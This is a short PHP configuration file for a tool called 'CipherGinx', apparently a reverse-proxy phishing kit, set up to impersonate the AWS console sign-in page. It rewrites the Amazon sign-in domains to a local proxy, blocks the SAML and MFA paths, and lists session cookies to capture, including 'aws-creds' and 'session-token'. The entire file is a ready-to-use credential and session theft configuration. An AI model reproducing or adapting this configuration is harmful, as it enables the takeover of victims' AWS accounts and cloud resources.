<?php
// CipherGinx PHP - Amazon AWS Phishing Configuration
// Targets AWS console login

return [
    'hostname' => 'signin.aws.amazon.com',
    'isSSL' => true,
    'server' => 'localhost',
    'port' => 443,

    'inject_domain' => [
        ['signin.aws.amazon.com', 'localhost'],
        ['aws.amazon.com', 'localhost'],
        ['console.aws.amazon.com', 'localhost'],
    ],

    'req_headers' => [
        ['', ['Connection' => 'close']],
    ],

    'resp_headers' => [
        ['', []],
    ],

    'req_body' => [],

    'resp_body' => [
        ['', 'https://signin.aws.amazon.com', 'https://localhost'],
    ],

    'block_paths' => [
        '/saml',
        '/mfa',
    ],

    'get_cookie' => [
        'AWSALB',
        'AWSALBCORS',
        'aws-creds',
        'ubid-acbus',
        'session-token',
    ],
];
